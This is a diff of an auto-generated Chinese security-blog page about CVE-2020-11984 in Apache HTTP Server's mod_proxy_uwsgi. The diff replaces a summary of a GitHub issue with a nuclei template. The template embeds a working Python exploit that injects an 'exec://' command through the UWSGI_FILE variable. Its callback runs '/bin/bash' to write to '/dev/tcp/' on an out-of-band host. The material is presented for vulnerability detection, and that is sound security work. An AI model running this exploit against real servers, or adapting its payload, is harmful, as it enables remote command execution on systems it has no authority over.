@@ -19,23 +19,23 @@
   <meta name="author" content="lianccc">
   <meta name="keywords" content="">
   
-    <meta name="description" content="漏洞信息漏洞名称： Apache HTTP Server mod_proxy_uwsgi 信息泄露与远程代码执行漏洞 漏洞编号：  CVE： CVE-2020-11984  漏洞类型： 信息泄露 漏洞等级： 严重 漏洞描述： Apache HTTP Server 2.4.32至2.4.44版本中的mod_proxy_uwsgi模块存在信息泄露及可能的远程代码执行漏洞。远程攻击者可通过发送特制请求访">
+    <meta name="description" content="漏洞信息漏洞名称： Apache HTTP Server Remote Code Execution Vulnerability 漏洞编号：  CVE： CVE-2020-11984  漏洞类型： 命令执行 漏洞等级： 严重 漏洞描述： Apache HTTP Server 2.4.32至2.4.44版本中的mod_proxy_uwsgi模块存在信息泄露和可能的远程代码执行漏洞，远程攻击者通过发送">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Apache HTTP Server mod_proxy_uwsgi 信息泄露与远程代码执行漏洞">
-<meta property="og:url" content="http://example.com/2025/06/21/github_2105330856/index.html">
+<meta property="og:title" content="Apache HTTP Server Remote Code Execution Vulnerability">
+<meta property="og:url" content="http://example.com/2025/06/22/github_1164421906/index.html">
 <meta property="og:site_name" content="liancc&#39; infos blog">
-<meta property="og:description" content="漏洞信息漏洞名称： Apache HTTP Server mod_proxy_uwsgi 信息泄露与远程代码执行漏洞 漏洞编号：  CVE： CVE-2020-11984  漏洞类型： 信息泄露 漏洞等级： 严重 漏洞描述： Apache HTTP Server 2.4.32至2.4.44版本中的mod_proxy_uwsgi模块存在信息泄露及可能的远程代码执行漏洞。远程攻击者可通过发送特制请求访">
+<meta property="og:description" content="漏洞信息漏洞名称： Apache HTTP Server Remote Code Execution Vulnerability 漏洞编号：  CVE： CVE-2020-11984  漏洞类型： 命令执行 漏洞等级： 严重 漏洞描述： Apache HTTP Server 2.4.32至2.4.44版本中的mod_proxy_uwsgi模块存在信息泄露和可能的远程代码执行漏洞，远程攻击者通过发送">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-06-21T22:00:17.250Z">
-<meta property="article:modified_time" content="2025-06-21T22:00:17.257Z">
+<meta property="article:published_time" content="2025-06-22T02:45:37.634Z">
+<meta property="article:modified_time" content="2025-06-22T02:45:37.632Z">
 <meta property="article:author" content="lianccc">
 <meta property="article:tag" content="projectdiscovery&#x2F;nuclei-templates:github issues">
-<meta property="article:tag" content="信息泄露">
+<meta property="article:tag" content="命令执行">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>Apache HTTP Server mod_proxy_uwsgi 信息泄露与远程代码执行漏洞 - liancc&#39; infos blog</title>
+  <title>Apache HTTP Server Remote Code Execution Vulnerability - liancc&#39; infos blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -202,7 +202,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Apache HTTP Server mod_proxy_uwsgi 信息泄露与远程代码执行漏洞"></span>
+            <span id="subtitle" data-typed-text="Apache HTTP Server Remote Code Execution Vulnerability"></span>
           
         </div>
 
@@ -213,8 +213,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-06-21 22:00" pubdate>
-          2025年6月21日 晚上
+        <time datetime="2025-06-22 02:45" pubdate>
+          2025年6月22日 凌晨
         </time>
       </span>
     
@@ -225,7 +225,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          209 字
+          454 字
         
       </span>
     
@@ -236,7 +236,7 @@
         
         
         
-          2 分钟
+          4 分钟
         
       </span>
     
@@ -273,38 +273,27 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">Apache HTTP Server mod_proxy_uwsgi 信息泄露与远程代码执行漏洞</h1>
+            <h1 id="seo-header">Apache HTTP Server Remote Code Execution Vulnerability</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Apache HTTP Server mod_proxy_uwsgi 信息泄露与远程代码执行漏洞</p>
+                <h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Apache HTTP Server Remote Code Execution Vulnerability</p>
 <p><strong>漏洞编号：</strong></p>
 <ul>
 <li><strong>CVE：</strong> CVE-2020-11984</li>
 </ul>
-<p><strong>漏洞类型：</strong> 信息泄露</p>
+<p><strong>漏洞类型：</strong> 命令执行</p>
 <p><strong>漏洞等级：</strong> 严重</p>
-<p><strong>漏洞描述：</strong> Apache HTTP Server 2.4.32至2.4.44版本中的mod_proxy_uwsgi模块存在信息泄露及可能的远程代码执行漏洞。远程攻击者可通过发送特制请求访问敏感信息并可能执行任意代码。</p>
-<p><strong>产品厂商：</strong> Apache</p>
-<p><strong>产品名称：</strong> Apache HTTP Server</p>
+<p><strong>漏洞描述：</strong> Apache HTTP Server 2.4.32至2.4.44版本中的mod_proxy_uwsgi模块存在信息泄露和可能的远程代码执行漏洞，远程攻击者通过发送精心构造的请求可以访问敏感信息并可能执行任意代码。</p>
+<p><strong>产品厂商：</strong> apache</p>
+<p><strong>产品名称：</strong> http_server</p>
 <p><strong>影响版本：</strong> 2.4.32 &lt;&#x3D; version &lt;&#x3D; 2.4.44</p>
-<p><strong>搜索语法：</strong> cpe:”cpe:2.3:a:apache:http_server”</p>
-<p><strong>来源：</strong> <a target="_blank" rel="noopener" href="https://github.com/projectdiscovery/nuclei-templates/issues/12266">https://github.com/projectdiscovery/nuclei-templates/issues/12266</a></p>
+<p><strong>搜索语法：</strong> server: cpe:”cpe:2.3:a:apache:http_server”</p>
+<p><strong>来源：</strong> <a target="_blank" rel="noopener" href="https://github.com/projectdiscovery/nuclei-templates/blob/e26ecd76b84e1ea8241abe91fd4e65d37908c2c3/code%2Fcves%2F2020%2FCVE-2020-11984.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/e26ecd76b84e1ea8241abe91fd4e65d37908c2c3/code%2Fcves%2F2020%2FCVE-2020-11984.yaml</a></p>
 <p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p>
-<h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h4><blockquote>
-<p>Apache HTTP Server 2.4.32 to 2.4.44 contains an info disclosure and possible remote code execution caused by a vulnerability in mod_proxy_uwsgi, letting remote attackers access sensitive information and potentially execute arbitrary code, exploit requires sending crafted requests.</p>
-</blockquote>
-<h5 id="Severity-Critical"><a href="#Severity-Critical" class="headerlink" title="Severity: Critical"></a>Severity: <code>Critical</code></h5><h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><ul>
-<li><a target="_blank" rel="noopener" href="http://packetstormsecurity.com/files/159009/Apache2-mod_proxy_uwsgi-Incorrect-Request-Handling.html">http://packetstormsecurity.com/files/159009/Apache2-mod_proxy_uwsgi-Incorrect-Request-Handling.html</a></li>
-</ul>
-<h4 id="KEV-True"><a href="#KEV-True" class="headerlink" title="KEV: True"></a>KEV: True</h4><h4 id="Shodan-Query-cpe-cpe-2-3-a-apache-http-server"><a href="#Shodan-Query-cpe-cpe-2-3-a-apache-http-server" class="headerlink" title="Shodan Query: cpe:&quot;cpe:2.3:a:apache:http_server&quot;"></a>Shodan Query: <code>cpe:&quot;cpe:2.3:a:apache:http_server&quot;</code></h4><blockquote>
-<p>Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(<code>-debug</code>) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. </p>
-</blockquote>
-<blockquote>
-<p>Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.</p>
-</blockquote>
-<p>You can check the FAQ for the Nuclei Templates Community Rewards Program <a target="_blank" rel="noopener" href="https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md">here</a>.</p>
+<h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-built_in">id</span>: CVE-<span class="hljs-number">2020</span>-<span class="hljs-number">11984</span><br><br>info:<br>  name: Apache HTTP Server - Remote Code Execution<br>  author: wofeiwo@80sec.com,pszyszkowski<br>  severity: critical<br>  description: |<br>    Apache HTTP Server <span class="hljs-number">2.4</span><span class="hljs-number">.32</span> to <span class="hljs-number">2.4</span><span class="hljs-number">.44</span> contains an info disclosure <span class="hljs-keyword">and</span> possible remote code execution caused by a vulnerability <span class="hljs-keyword">in</span> mod_proxy_uwsgi, letting remote attackers access sensitive information <span class="hljs-keyword">and</span> potentially execute arbitrary code, exploit requires sending crafted requests.<br>  remediation: |<br>    Update to &gt;= <span class="hljs-number">2.4</span><span class="hljs-number">.45</span><br>  reference:<br>    - https://github.com/RubenBar/MLW-upcrans/tree/main/<span class="hljs-number">1.</span>Exploit<br>    - https://nvd.nist.gov/vuln/detail/cve-<span class="hljs-number">2020</span>-<span class="hljs-number">11984</span><br>  classification:<br>    cvss-metrics: CVSS:<span class="hljs-number">3.1</span>/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H<br>    cvss-score: <span class="hljs-number">9.8</span><br>    cve-<span class="hljs-built_in">id</span>: CVE-<span class="hljs-number">2020</span>-<span class="hljs-number">11984</span><br>    cwe-<span class="hljs-built_in">id</span>: CWE-<span class="hljs-number">120</span><br>  metadata:<br>    verified: true<br>    vendor: apache<br>    product: http_server<br>    shodan-query:<br>      - server: cpe:<span class="hljs-string">&quot;cpe:2.3:a:apache:http_server&quot;</span><br>  tags: cve,cve2020,apache,httpd,rce<br>variables:<br>  callback: <span class="hljs-string">&quot;/bin/bash -c &#x27;echo 1 &gt; /dev/tcp/&#123;&#123;interactsh-url&#125;&#125;/80&#x27;&quot;</span><br>code:<br>  - engine:<br>      - py<br>      - python3<br>    source: |<br>      <span class="hljs-keyword">import</span> sys<br>      <span class="hljs-keyword">import</span> os<br>      <span class="hljs-keyword">import</span> argparse<br>      <span class="hljs-keyword">import</span> requests<br><br>      uwsgi_addr = os.getenv(<span class="hljs-string">&#x27;BaseURL&#x27;</span>)<br>      command = os.getenv(<span class="hljs-string">&#x27;callback&#x27;</span>)<br><br>      <span class="hljs-keyword">def</span> <span class="hljs-title function_">sz</span>(<span class="hljs-params">x</span>):<br>          s = <span class="hljs-built_in">hex</span>(x <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(x, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">len</span>(x))[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;0&#x27;</span>)<br>          s = <span class="hljs-built_in">bytes</span>.fromhex(s)<br>          <span class="hljs-keyword">return</span> s[::-<span class="hljs-number">1</span>]<br><br>      <span class="hljs-keyword">def</span> <span class="hljs-title function_">pack_uwsgi_vars</span>(<span class="hljs-params">var</span>):<br>          pk = <span class="hljs-string">b&#x27;&#x27;</span><br>          <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> var.items() <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(var, <span class="hljs-string">&#x27;items&#x27;</span>) <span class="hljs-keyword">else</span> var:<br>              pk += sz(k) + k.encode(<span class="hljs-string">&#x27;utf8&#x27;</span>) + sz(v) + v.encode(<span class="hljs-string">&#x27;utf8&#x27;</span>)<br>          result = <span class="hljs-string">b&#x27;\x00&#x27;</span> + sz(pk) + <span class="hljs-string">b&#x27;\x00&#x27;</span> + pk<br>          <span class="hljs-keyword">return</span> result<br><br>      <span class="hljs-keyword">def</span> <span class="hljs-title function_">fetch_data</span>(<span class="hljs-params">uri, var=<span class="hljs-literal">None</span>, payload=<span class="hljs-literal">None</span>, body=<span class="hljs-literal">None</span></span>):<br>          <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;http&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> uri:<br>              uri = <span class="hljs-string">&#x27;http://&#x27;</span> + uri<br><br>          session = requests.Session()<br><br>          d = session.get(uri, data=pack_uwsgi_vars(var))<br><br>          <span class="hljs-keyword">return</span> &#123;<br>              <span class="hljs-string">&#x27;code&#x27;</span>: d.status_code,<br>              <span class="hljs-string">&#x27;text&#x27;</span>: d.text,<br>              <span class="hljs-string">&#x27;header&#x27;</span>: d.headers<br>          &#125;<br><br>      <span class="hljs-keyword">def</span> <span class="hljs-title function_">curl</span>(<span class="hljs-params">addr_and_port, payload, uri</span>):<br>          var = &#123;<span class="hljs-string">&#x27;UWSGI_FILE&#x27;</span>: payload, <span class="hljs-string">&#x27;SCRIPT_NAME&#x27;</span>: uri&#125;<br>          <span class="hljs-keyword">return</span> fetch_data(addr_and_port+uri, var, payload)<br><br>      <span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">*args</span>):<br>          payload = <span class="hljs-string">&#x27;exec://&#x27;</span> + command + <span class="hljs-string">&#x27;; echo &quot;&quot;&#x27;</span> <span class="hljs-comment"># must have someting in output or the uWSGI crashs.</span><br>          <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*]Sending payload.&quot;</span>)<br>          <span class="hljs-built_in">print</span>(curl(uwsgi_addr, payload, <span class="hljs-string">&#x27;/penetrate&#x27;</span>))<br><br>      <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>          main()<br>    matchers:<br>      - <span class="hljs-built_in">type</span>: word<br>        part: interactsh_protocol<br>        words:<br>          - <span class="hljs-string">&quot;dns&quot;</span><br><br></code></pre></td></tr></table></figure>
+
 
                 
               </div>
@@ -340,7 +329,7 @@
       
         <a href="/tags/projectdiscovery-nuclei-templates-github-issues/" class="print-no-link">#projectdiscovery/nuclei-templates:github issues</a>
       
-        <a href="/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" class="print-no-link">#信息泄露</a>
+        <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="print-no-link">#命令执行</a>
       
     </div>
   
@@ -352,8 +341,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Apache HTTP Server mod_proxy_uwsgi 信息泄露与远程代码执行漏洞</div>
-      <div>http://example.com/2025/06/21/github_2105330856/</div>
+      <div>Apache HTTP Server Remote Code Execution Vulnerability</div>
+      <div>http://example.com/2025/06/22/github_1164421906/</div>
     </div>
     <div class="license-meta">
       
@@ -365,7 +354,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年6月21日</div>
+          <div>2025年6月22日</div>
         </div>
       
       
@@ -397,18 +386,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/06/21/weixin_574596012/" title="CVE-2025-27817 Apache Kafka Connect 任意文件读取漏洞分析与复现">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">CVE-2025-27817 Apache Kafka Connect 任意文件读取漏洞分析与复现</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/06/21/github_117162648/" title="Github Poc">
-                        <span class="hidden-mobile">Github Poc</span>
+                      <a href="/2025/06/22/github_2105330856/" title="Apache HTTP Server mod_proxy_uwsgi 信息泄露与远程代码执行漏洞">
+                        <span class="hidden-mobile">Apache HTTP Server mod_proxy_uwsgi 信息泄露与远程代码执行漏洞</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
